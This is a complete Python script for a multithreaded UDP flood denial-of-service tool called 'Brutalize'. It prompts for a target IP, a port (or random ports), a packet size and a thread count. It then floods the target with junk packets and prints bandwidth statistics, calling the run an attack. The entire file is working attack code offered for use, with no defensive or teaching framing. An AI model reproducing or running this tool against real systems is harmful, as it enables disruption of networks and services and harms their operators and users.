# Required Libraries
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep
import re

class Brutalize:
    def __init__(self, ip, port, force, threads):
        # Initialization of the class variables
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        # Create a UDP client socket
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # Data to be sent in each packet
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
        # Control variable for the attack loop
        self.on = False
        # List to track threads
        self.threads_list = []

    def flood(self):
        # Start the attack
        self.on = True
        self.sent = 0
        # Create threads to send packets
        for _ in range(self.threads):
            t = Thread(target=self.send)
            t.start()
            self.threads_list.append(t)
        # Start a thread to display attack info
        Thread(target=self.info).start()

    def info(self):
        # Display attack statistics
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        while self.on:
            sleep(interval)
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' '*20}", end='\r')
            now2 = time()
            if now + 1 >= now2:
                continue
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def stop(self):
        # Stop the attack and join all threads
        self.on = False
        for thread in self.threads_list:
            thread.join()

    def send(self):
        # Send packets to the target
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except Exception as e:
                print(f"Error sending packet: {e}")

    def _randaddr(self):
        # Generate a random address with the target IP and a random port
        return (self.ip, self._randport())

    def _randport(self):
        # Generate a random port number
        return self.port or randint(1, 65535)

def validate_ip(ip):
    # Validate the IP address using regex
    pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})(\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})){3}$")
    return bool(pattern.match(ip))

def main():
    # Collect user input
    ip = input("Enter the IP to Brutalize: ")
    # Validate IP
    if not validate_ip(ip):
        print("Error! Please enter a correct IP address.")
        exit()

    port = input("Enter port [press enter to attack all ports]: ")
    # Validate port
    if port == '':
        port = None
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                raise ValueError
        except ValueError:
            print("Error! Please enter a correct port.")
            exit()

    force = input("Bytes per packet [press enter for 1250]: ")
    # Validate force (packet size)
    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print("Error! Please enter an integer.")
            exit()

    threads = input("Threads [press enter for 100]: ")
    # Validate number of threads
    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            print("Error! Please enter an integer.")
            exit()

    cport = '' if port is None else f':{port}'
    print(f"Starting attack on {ip}{cport}.", end='\r')
    # Initialize Brutalize class
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occurred and the attack was stopped.")
    try:
        while brute.on:
            sleep(1)
    except KeyboardInterrupt:
        # Stop the attack on a keyboard interrupt
        brute.stop()
        print(f"\nAttack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')
    input("Press enter to exit.")

if __name__ == '__main__':
    main()
